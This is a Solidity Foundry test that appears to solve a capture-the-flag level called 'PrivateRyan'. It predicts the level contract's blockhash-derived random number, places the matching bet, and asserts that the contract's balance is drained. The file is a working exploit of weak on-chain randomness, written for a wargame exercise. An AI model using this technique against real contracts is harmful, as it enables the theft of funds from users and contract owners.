// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/02_PrivateRyan/PrivateRyan.sol";

// forge test --match-contract PrivateRyanTest -vvvv
contract PrivateRyanTest is BaseTest {
    PrivateRyan instance;

    uint256 constant CONTRACT_FACTOR = 1157920892373161954135709850086879078532699843656405640394575840079131296399;

    function setUp() public override {
        super.setUp();
        vm.roll(48743985);
        instance = new PrivateRyan{value: 0.01 ether}();
    }

    function testExploitLevel() public {
        uint256 newSeed = generateContractRandom(256, 48743984);
        uint256 bet = generateContractRandom(100, 48743985 - newSeed);

        instance.spin{value: 0.01 ether}(bet);

        checkSuccess();
    }

    function generateContractRandom(uint256 max, uint256 blockNumber) private view returns (uint256) {
        uint256 factor = (CONTRACT_FACTOR * 100) / max;
        uint256 hashVal = uint256(blockhash(blockNumber));

        return uint256((uint256(hashVal) / factor)) % max;
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
